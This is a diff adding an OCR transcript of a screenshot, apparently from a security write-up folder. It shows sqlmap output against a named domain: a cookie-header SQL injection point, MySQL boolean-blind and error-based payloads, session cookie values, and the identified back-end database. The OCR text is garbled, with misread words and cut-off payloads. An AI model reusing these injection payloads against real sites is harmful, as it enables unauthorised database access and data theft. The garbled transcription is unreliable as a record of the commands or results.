@@ -1,0 +1,30 @@
+# OCR: 34bb27a8e2435f938af75cf2ac65c2c6.jpg
+# 来源: .\02-WriteUp\2024\34bb27a8e2435f938af75cf2ac65c2c6.jpg
+# 引擎: tesseract(chi_sim+eng)
+# 生成: 2026-08-31 15:26
+
+> FAP > Administrator > AppData > Local > sqlmap > output > gg.aigua666.com
+3
+dump
+Diteg
+Di sessionsalite
+Bi targets
+H ISM WEP) BEN) ean
+瑛 qlnap identified the following injection point(s) with a total of 406 HTTP(s) requests
+Parameter: Cookie #1* ((custom) HEADER)
+Types pooieanzpase O1ING
+Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+Payload: PHPSESSID-545u850ajk5pv21u720ge328eh;_c_usd="13777544812') RLIKE (SELECT (CASE |
+END))-- kYjU"; c_psd=494c059#b44681b441279F80595e31a2
+Type: error-based
+Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTI0 5
+Payload: PHPSESSID-545u850ajk5pv21u720ge328eh; c_usd="13777544812') AND GTID_SUBSET(CONC
+8776-8776,1))),0x71706a7071) 8776) -- yqHZ"; c_psd=494c059#b44681b441279#80595e31a2
+web application technology: Nginx
+back-end DBMS: MySQL >= 5.6
+sqlnap resumed the following injection point(s) from stored session:
+Parameter: Cookie #1* ((custom) HEADER)
+Type: boolean-based blind
+Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+Payload: PHPSESSID-545u850ajk5pv21u720ge328eh; c_usd="13777544812') RLIKE (SELECT (CASE |
+END))-- j 4c859fb44681b441279188595e31a2
